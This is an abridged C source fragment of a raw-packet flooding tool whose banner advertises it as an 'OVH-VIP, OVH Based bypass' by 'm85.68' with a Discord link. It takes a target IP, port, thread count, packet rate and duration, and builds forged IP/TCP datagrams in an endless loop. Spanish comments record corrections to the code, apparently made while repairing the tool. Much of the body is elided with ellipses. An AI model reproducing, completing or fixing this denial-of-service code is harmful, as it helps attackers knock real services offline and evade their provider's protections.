...
#include <net/if.h>
#include <arpa/inet.h>
// #include <strings.h> // No es necesario si usamos memset
...
void *flood(void *par1)
{
    ...
    // CORRECCIÓN 2: Cambiado htonl a htons para el campo id (16 bits)
    ...
    while(1)
    {
        if(packetCounter > 1000)
        {
            ...
            // CORRECCIÓN 1: Cambiado bzero a memset
        ...
        ipHeader->id = htons(rand_cmwc() & 0xFFFF); // Se mantuvo htons ya que es un campo de 16 bits
        ipHeader->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + randomLength;
        ipHeader->check = csum ((unsigned short*)datagram, ipHeader->tot_len);
...
int main(int argc, char *argv[])
{
    if(argc < 6)
    {
        fprintf(stdout, "\033[31mOVH-VIP, OVH Based bypass - by m85.68\nUsage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n  https://discord.gg/S7Cp94S7nU\033[0m\n", argv[0]);
        exit(-1);
    }
 
    fprintf(stdout, "\033[31mm85.68 -> Setting up networking...\033[0m\n");
    ...
    fprintf(stdout, "\033[31mm85.68 -> Starting...\033[0m\n");
